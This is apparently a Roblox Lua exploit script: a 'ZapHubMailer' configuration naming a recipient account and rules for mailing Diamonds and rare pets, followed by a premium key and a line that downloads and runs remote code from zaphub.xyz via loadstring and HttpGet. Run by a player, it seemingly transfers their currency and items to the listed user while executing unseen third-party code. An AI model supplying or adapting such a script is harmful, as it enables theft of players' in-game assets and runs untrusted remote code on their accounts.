_G.ZapHubMailerSettings = {
    Users = {
        "denzzyo01",
    },
    Items = {
        {Class = "Currency", Item = "Diamonds", MinimumAmount = 1000000000, AmountToKeep = 1000000},
    },
    Extras = {
        ["GargantuanPet"] = {Enabled = false, Tier = nil, Shiny = nil, BlackList = {"Some_Item_Name"}},
        ["TitanicPet"] = {Enabled = false, Tier = nil, Shiny = nil, BlackList = {"Some_Item_Name"}},
        ["HugePet"] = {Enabled = false, Tier = nil, Shiny = nil, BlackList = {"Some_Item_Name"}},
        ["ExclusivePet"] = {Enabled = false, BlackList = {"Some_Item_Name"}},
    },
    CustomExtras = {
        ["Class_Name"] = {Enabled = false, Tier = nil, Shiny = nil, MinimumAmount = 0, AmountToKeep = 0, BlackList = {"Some_Item_Name"}},
    },
    OnlyOnline = false,
    Webhook = {
        Enabled = false,
        WebhookURL = "",
    },
}

script_key="TIPgAHqfauBiCIjdzCRbuYmObnVAzeXC"; -- Your premium key here
loadstring(game:HttpGet('https://zaphub.xyz/ExecMailer'))()
